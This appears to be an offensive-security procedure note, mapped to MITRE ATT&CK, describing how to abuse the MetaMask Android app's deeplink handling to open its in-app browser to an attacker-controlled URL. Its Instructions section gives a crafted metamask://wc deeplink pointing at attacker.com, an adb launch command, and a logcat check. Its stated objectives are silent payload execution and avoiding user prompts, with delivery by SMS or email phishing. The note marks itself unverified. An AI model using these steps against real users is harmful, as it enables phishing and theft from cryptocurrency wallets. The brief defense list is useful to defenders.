---
tags:
  - deeplink-abuse
  - metamask
  - android
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Android
  - Mobile
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:24:44.911Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: af1c8cd6-7c91-42d6-b5e8-baf8379ca67b
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Abuse-Deeplink-to-Access-MetaMask-In-App-Browser

## Summary

This procedure exploits the MetaMask Android app's deeplink handling to directly access the in-app browser, bypassing normal navigation flows and setting up for further exploitation without user awareness.

## Description

The MetaMask app uses deeplinks for wallet connect and browser interactions. By crafting a malicious deeplink, attackers can force the app to open its WebView-based in-app browser to an attacker-controlled URL. This occurs without standard app menus or confirmations, as discovered by UGWST researchers. The target environment is any Android device with MetaMask installed. Expected outcomes include immediate browser access, enabling subsequent malicious actions like downloads.

## Requirements

1. Android device with MetaMask app version vulnerable to deeplink abuse (pre-patch)
2. Access to craft and deliver deeplinks (e.g., via phishing or ADB for testing)
3. Attacker server hosting the target URL

## Defense

Defensive measures and detection strategies:

- Implement strict deeplink validation in apps to require user confirmation for browser navigation
- Monitor app logs for unexpected intent launches
- Use mobile security tools like app vetting or runtime monitoring to flag anomalous WebView activity

## Objectives

1. Gain unauthorized access to the in-app browser
2. Position for silent execution of malicious payloads
3. Avoid detection by skipping user prompts

## Instructions

### Step 1: Craft Malicious Deeplink

**Context**: Construct a deeplink that targets the wallet connect URI scheme to inject browser navigation.

Use a URL like `metamask://wc?uri=<base64-encoded-attacker-url>`. For testing, encode the malicious site: base64("https://attacker.com/exploit"). Deliver via SMS or email.

### Step 2: Launch Deeplink on Target Device

**Context**: Trigger the deeplink to open the app and browser directly.

On a test setup, simulate with ADB: `adb shell am start -W -a android.intent.action.VIEW -d "metamask://wc?uri=https%3A%2F%2Fattacker.com%2Fmalicious" com.metamask`. In real attacks, user clicks the link, launching the intent.

> This command starts the activity, and success is indicated by the browser loading the URL without additional prompts.

### Step 3: Verify Browser Access

**Context**: Confirm the in-app browser has opened to the controlled page.

Check device screen or logs: `adb logcat | grep WebView`. Look for WebView initialization and URL load.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- deeplink-abuse
- metamask
- android
